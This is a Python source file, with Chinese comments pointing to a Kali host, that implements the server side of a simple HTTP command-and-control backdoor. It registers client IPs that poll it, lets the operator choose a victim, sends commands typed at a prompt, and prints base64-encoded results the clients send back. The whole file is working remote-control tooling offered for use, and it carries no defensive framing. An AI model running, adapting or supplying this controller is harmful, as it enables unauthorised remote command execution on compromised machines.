# 服务端(如kali)需要修改/usr/lib/python3.6/http/server.py里面的def
# log_request中的在终端打印每个http请求的代码，要不然终端会有点乱
import pdb
import re
import sys
import time
from urllib.parse import quote
from exp10it import CLIOutput
from exp10it import base64decodeStr
from exp10it import MyThread

output = CLIOutput()
client_list = []
choose_client_ip = ""


def start_transfer_server():
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class S(BaseHTTPRequestHandler):
        def _set_headers(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_GET(self):
            global choose_client_ip
            ip = re.search(r"ip=([^&]+)", self.path)
            if ip:
                ip = ip.group(1)
            action = re.search(r"action=([^&]+)", self.path)
            if action:
                action = action.group(1)
            result = re.search(r"result=([^&]+)", self.path)
            if result:
                result = result.group(1)

            self._set_headers()
            if action == "askbecontroled":
                if ip not in client_list:
                    client_list.append(ip)
                if choose_client_ip == ip:
                    self.wfile.write("ok".encode("utf8"))
                else:
                    self.wfile.write("no".encode("utf8"))
            elif action == "askfororder":
                order = input("> ")
                self.wfile.write(order.encode("utf8"))
                if order == "bye":
                    print(client_list)
                    choose_client_ip = input("plaese choose your client:")
            elif action == "returnresult":
                result = base64decodeStr(result)
                print(result)
            else:
                self.wfile.write("It works!".encode("utf8"))

        def do_POST(self):
            headers = str(self.headers)
            content_length = int(self.headers['Content-Length'])
            data = self.rfile.read(content_length)

    def run(server_class=HTTPServer, handler_class=S, port=8080):
        server_address = ('', port)
        httpd = server_class(server_address, handler_class)
        print('Starting httpd...')
        httpd.serve_forever()

    run()


webserver_thread = MyThread(start_transfer_server, ())
webserver_thread.start()
while True:
    if client_list == []:
        time.sleep(1)
        continue
    else:
        break
print(client_list)
choose_client_ip = input("plaese choose your client:")
